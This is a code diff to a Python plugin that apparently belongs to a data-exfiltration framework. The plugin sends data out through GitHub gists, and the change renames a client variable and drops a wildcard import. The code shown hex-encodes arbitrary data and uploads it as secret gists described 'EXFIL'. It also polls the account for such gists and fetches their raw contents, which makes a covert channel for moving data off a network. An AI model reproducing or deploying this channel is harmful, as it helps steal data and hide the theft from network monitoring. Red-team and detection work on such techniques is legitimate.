@@ -1,21 +1,20 @@
-from github import *
 from binascii import hexlify, unhexlify
 import github
 import time
 import requests
 
 app_exfiltrate = None
-g = None
+client = None
 
 def send(data):
     app_exfiltrate.log_message('info', "[github] Sending {} bytes with Github".format(len(data)))
-    g.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(hexlify(data.encode()).decode())}, 'EXFIL')
+    client.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(hexlify(data.encode()).decode())}, 'EXFIL')
 
 def listen():
     app_exfiltrate.log_message('info', "[github] Checking for Gists")
     try:
         while True:
-            gists = list(g.get_user().get_gists())
+            gists = list(client.get_user().get_gists())
             for gist in gists[::-1]:
                 if gist.description == 'EXFIL':
                     url = gist.files['foobar.txt'].raw_data['raw_url']
@@ -36,7 +35,7 @@ def listen():
 
 class Plugin:
     def __init__(self, app, conf):
-        global app_exfiltrate, g
-        g = Github(conf['username'], conf['token'])
+        global app_exfiltrate, client
+        client = github.Github(conf['username'], conf['token'])
         app.register_plugin('github_gist', {'send': send, 'listen': listen})
         app_exfiltrate = app
